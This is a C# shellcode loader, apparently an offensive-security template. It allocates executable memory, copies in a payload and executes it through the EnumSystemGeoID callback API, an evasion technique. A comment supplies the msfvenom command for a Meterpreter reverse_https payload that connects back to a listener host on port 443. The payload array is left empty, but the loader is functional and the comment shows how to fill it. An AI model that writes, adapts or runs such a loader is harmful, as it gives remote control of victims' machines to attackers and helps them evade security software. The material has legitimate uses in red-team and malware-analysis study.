using System;
using System.Runtime.InteropServices;

// this program executes our shellcode via a pointer to another function eg. callback there are many more callback apis
   public class EnumReportApp
{
        private const int GEOCLASS_NATION = 16;
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        
        // Allocates memory for our payload
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
        // callback api to execute our shellcode via a pointer
        // https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemgeoid
        // found here: https://github.com/lstratman/Win32Interop/blob/master/Kernel32/Methods.cs
        [DllImport("kernel32.dll", EntryPoint = "EnumSystemGeoID")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumSystemGeoID(uint GeoClass, int ParentGeoId, IntPtr lpGeoEnumProc);
    
    static void Main()
    {  
        //our payload. Examle use metasploit x64: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.137 LPORT=443 -f csharp -b \x00
        byte[] payload = new byte[] {};
        IntPtr BaseAddress = IntPtr.Zero;
        // Allocate memory
        IntPtr funcAddr = VirtualAlloc(BaseAddress, (uint)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        // Copy our shellcode we can either use csharp marshal copy / virtualprotect / rtlmovememory  etc to copy our payload to the destination source
        Marshal.Copy(payload, 0, funcAddr, payload.Length);
        // Execution via Callback API
        EnumSystemGeoID(GEOCLASS_NATION, 0, funcAddr);
        }
       

}
